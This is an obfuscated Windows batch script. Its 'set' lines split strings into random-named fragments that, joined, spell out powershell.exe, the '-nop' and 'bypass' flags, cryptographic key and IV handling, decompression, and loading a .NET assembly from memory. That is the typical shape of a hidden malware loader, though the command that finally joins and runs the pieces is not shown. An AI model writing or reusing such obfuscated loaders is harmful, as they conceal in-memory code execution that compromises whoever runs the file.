@echo off
set "zIUqAFjQIr=Wi"
set "TlLcgvKIty=we"
set "wptZPmAImV=\W"
set "mMALahVVqF= /"
set "INbiZneKtf=ws"
set "MaFKGqDQtQ=do"
set "ffIZsiZNit=ll"
set "TXwHWwbZcD=ll"
set "SvMtDjkcka=.e"
set "DwrVxULYZq=\v"
set "ekPooecLgz=ow"
set "XagvvbSrGC=:\"
set "IKownPfNCP=rS"
set "CgWBdfNutD=in"
set "KMnlxpSGbw=st"
set "acbnYMFsFm=he"
set "mDVJOlukrL=rs"
set "DxDLIvINsg=Sy"
set "bHspYkSSUg=we"
set "mHbXTjsfFt=y "
set "YOTKkuNXXG=s\"
set "PrcgELoHzQ=0\"
set "iAOeyWiiMP=xe"
set "UBrtcorgdu=nd"
set "oJeDMQkydt=1."
set "NgLYmDLfQe=po"
set "AtixRGGeFT=32"
set "FeyjDiYgrj=he"
set "EaumftxGtM=Po"
set "cInylMolcD= C"
set "ejhBARfAmJ=py"
set "WFEphtwSRl=co"
set "CxKisfIHiH=em"
set "nIASpLoWGW=cd"
set "VQYrVQbyZm= %~dp0"
set "ClqOhFuBtr=Syst"
set "gVrvBVwIfS=ptog"
set "KLyEQfwzxs=pDZz"
set "KpIYKLdJCo=ke($"
set "ETStLEKENh=LohF"
set "iBXYhquiJG=();$"
set "dyvGBhQEmr=6] -"
set "fLvdvPJiwA=rii "
set "JpxRvzwyfW=ZEjA"
set "vThrxkbsFB=);$D"
set "AFDZCCyKor=uPeZ"
set "fJkBqQWakw=.Key"
set "HaVPQmqtwO=('%*'"
set "bLkUkOIFjl=daeR"
set "SnCauWfXuW=bjec"
set "kLOMMaSEEh=F = "
set "hmSInSpTwV=vj0m"
set "FdzEdCrGsf=yste"
set "cJTTMjRAXa=pLoh"
set "OsAVfyedrI=comp"
set "sRYYAKuhtf=t Sy"
set "lEfPPQmKVR=eam("
set "KuJpKqkwCf=OyzA"
set "frpvcITinC=ion."
set "EbzjTxeiwH=ZYYc"
set "TmYrnbITOv=..-1"
set "fyFnqqZgdJ=-nop"
set "MqqElWZSDF=$GxG"
set "jwoZOxhGfx=esMa"
set "NCeRlfuFKX=('l0"
set "BGVxBxtLwB=tion"
set "XfwgXTtwuK=rt]:"
set "AFLwpiXFos=tsWi"
set "YSuDEytvzf=m.IO"
set "DTjlGmQMvt='txe"
set "DpychLQeIs=mory"
set "GUkBEyuGBn=16] "
set "gAvQBZkeXu=F, 0"
set "ktxVUEXDzL=v4Ir"
set "xjTzXQlCTo=e]::"
set "XtBccLQETV=Fo7l"
set "WONoiYIeaw=bypa"
set "vnuwANoPrD=tem."
set "MVAsPlTBHr=ress"
set "IWdhYgUaMj=.Ass"
set "OyBuYLBmlW=]::("
set "jfnqjqJehB=7Yiv"
set "BauvlTtuwJ=);$D"
set "ZgZPayxPyS=vert"
set "HRiOMZHuHu=h.Su"
set "GlYpqioZlf=7;$D"
set "lkwviVQeVa=k; }"
set "gwsUTjjKFW='[-1"
set "zUJOsQjVkF=).Sp"
set "shzvRADgUU= = $"
set "gfcoNciRyo=ose("
set "KUaNEwlxjM=3HWs"
set "JxqTAKOiGt=ck($"
set "mIxpahkyJk=fore"
set "nQOixSvxJL=urit"
set "sOTgAxMzuI=ptor"
